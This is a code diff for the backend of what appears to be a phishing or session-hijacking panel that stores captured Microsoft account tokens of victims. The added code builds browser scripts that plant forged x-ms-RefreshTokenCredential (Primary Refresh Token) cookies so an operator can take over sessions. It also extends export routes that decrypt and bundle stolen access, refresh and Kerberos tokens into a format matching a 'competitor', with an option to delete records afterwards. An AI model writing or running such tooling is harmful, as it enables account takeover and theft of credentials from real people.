@@ -241,7 +241,25 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     // Generate x-ms-RefreshTokenCredential PRT script (most reliable method)
     var prtScript = null;
     var prtError = null;
-    if (refreshToken) {
+    
+    // First, try to REFRESH stored PRT cookie from device_credentials table
+    // Always generate a FRESH PRT cookie - never reuse old ones
+    if (token.user_id && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      try {
+        const cookieConverter = require('../services/cookieconverter');
+        console.log('[Tokens] Refreshing PRT cookie for user', token.user_id, 'tenant', tenant);
+        const freshPrt = await cookieConverter.refreshStoredPrtCookie(token.user_id, tenant);
+        if (freshPrt) {
+          console.log('[Tokens] Fresh PRT cookie generated from device credentials');
+          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${freshPrt}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
+        }
+      } catch (refreshErr) {
+        console.error('[Tokens] Failed to refresh PRT:', refreshErr.message);
+      }
+    }
+    
+    // If no stored device credentials, generate from refresh token with unique nonce
+    if (!prtScript && refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
         var tid = tenant;
@@ -284,7 +302,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
           // IMPORTANT: Do NOT include domain attribute - browsers block third-party cookies
           // Set cookie for current page only, then redirect to auth endpoint
           prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
-          console.log('[Tokens] PRT script generated successfully');
+          console.log('[Tokens] PRT script generated from refresh token');
         } else {
           prtError = 'PRT cookie generation returned null value';
         }
@@ -1134,7 +1152,7 @@ router.post('/export', userAuth, async (req, res) => {
     const deleteAfter = req.body && req.body.delete_after === true;
 
     const [tokens] = await db.query(
-      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
 
@@ -1143,22 +1161,50 @@ router.post('/export', userAuth, async (req, res) => {
         if (!val) return null;
         try { return decrypt(val); } catch (e) { return null; }
       };
+
+      // Build PRT JSON object matching competitor format
+      const prtData = {
+        token_type: 'Bearer',
+        expires_in: 1209599,
+        ext_expires_in: 0,
+        expires_on: token.expiration ? Math.floor(new Date(token.expiration).getTime() / 1000) : null,
+        refresh_token: safeDecrypt(token.refresh_token_encrypted),
+        refresh_token_expires_in: 1209599,
+        id_token: safeDecrypt(token.id_token_encrypted),
+        client_info: null,
+        session_key_jwe: safeDecrypt(token.session_key_jwe),
+        device_tenant_id: safeDecrypt(token.device_tenant_id),
+        tgt_ad: safeDecrypt(token.tgt_ad),
+        tgt_cloud: safeDecrypt(token.tgt_cloud),
+        kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
+        session_key: null,
+        tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
+      };
+
+      // Try to extract client_info from session_key_jwe
+      if (prtData.session_key_jwe) {
+        try {
+          const parsed = JSON.parse(prtData.session_key_jwe);
+          if (parsed.client_info) {
+            prtData.client_info = parsed.client_info;
+          }
+          if (parsed.session_key) {
+            prtData.session_key = parsed.session_key;
+          }
+        } catch (e) { /* ignore */ }
+      }
+
       return {
-        id: token.id,
-        email: token.email,
-        token_type: token.token_type,
-        ip_address: token.ip_address,
-        user_agent: token.user_agent,
-        notes: token.notes || '',
-        expiration: token.expiration,
-        created_at: token.created_at,
+        mode: token.token_type || 'cookie',
+        email: token.email || '',
+        name: token.email ? token.email.split('@')[0] : '',
         access_token: safeDecrypt(token.access_token_encrypted),
         refresh_token: safeDecrypt(token.refresh_token_encrypted),
-        id_token: safeDecrypt(token.id_token_encrypted),
-        cookies: safeDecrypt(token.cookies_encrypted),
-        prt: safeDecrypt(token.prt),
-        session_key_jwe: safeDecrypt(token.session_key_jwe),
-        account_type: token.account_type || 'unknown'
+        prt: JSON.stringify(prtData),
+        expires_at: token.expiration ? new Date(token.expiration).toISOString() : null,
+        status: 'active',
+        notes: token.notes || null,
+        created_at: token.created_at ? new Date(token.created_at).toISOString() : null
       };
     });
 
@@ -1185,24 +1231,55 @@ router.post('/export', userAuth, async (req, res) => {
 router.post('/export-delete-all', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query(
-      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0',
       [req.user.id]
     );
 
-    const decryptedTokens = tokens.map(token => ({
-      id: token.id,
-      email: token.email,
-      token_type: token.token_type,
-      ip_address: token.ip_address,
-      user_agent: token.user_agent,
-      notes: token.notes,
-      expiration: token.expiration,
-      created_at: token.created_at,
-      access_token: decrypt(token.access_token_encrypted),
-      refresh_token: decrypt(token.refresh_token_encrypted),
-      id_token: decrypt(token.id_token_encrypted),
-      cookies: decrypt(token.cookies_encrypted)
-    }));
+    const decryptedTokens = tokens.map(token => {
+      const safeDecrypt = (val) => {
+        if (!val) return null;
+        try { return decrypt(val); } catch (e) { return null; }
+      };
+
+      const prtData = {
+        token_type: 'Bearer',
+        expires_in: 1209599,
+        ext_expires_in: 0,
+        expires_on: token.expiration ? Math.floor(new Date(token.expiration).getTime() / 1000) : null,
+        refresh_token: safeDecrypt(token.refresh_token_encrypted),
+        refresh_token_expires_in: 1209599,
+        id_token: safeDecrypt(token.id_token_encrypted),
+        client_info: null,
+        session_key_jwe: safeDecrypt(token.session_key_jwe),
+        device_tenant_id: safeDecrypt(token.device_tenant_id),
+        tgt_ad: safeDecrypt(token.tgt_ad),
+        tgt_cloud: safeDecrypt(token.tgt_cloud),
+        kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
+        session_key: null,
+        tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
+      };
+
+      if (prtData.session_key_jwe) {
+        try {
+          const parsed = JSON.parse(prtData.session_key_jwe);
+          if (parsed.client_info) prtData.client_info = parsed.client_info;
+          if (parsed.session_key) prtData.session_key = parsed.session_key;
+        } catch (e) { /* ignore */ }
+      }
+
+      return {
+        mode: token.token_type || 'cookie',
+        email: token.email || '',
+        name: token.email ? token.email.split('@')[0] : '',
+        access_token: safeDecrypt(token.access_token_encrypted),
+        refresh_token: safeDecrypt(token.refresh_token_encrypted),
+        prt: JSON.stringify(prtData),
+        expires_at: token.expiration ? new Date(token.expiration).toISOString() : null,
+        status: 'active',
+        notes: token.notes || null,
+        created_at: token.created_at ? new Date(token.created_at).toISOString() : null
+      };
+    });
 
     await db.query(
       'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
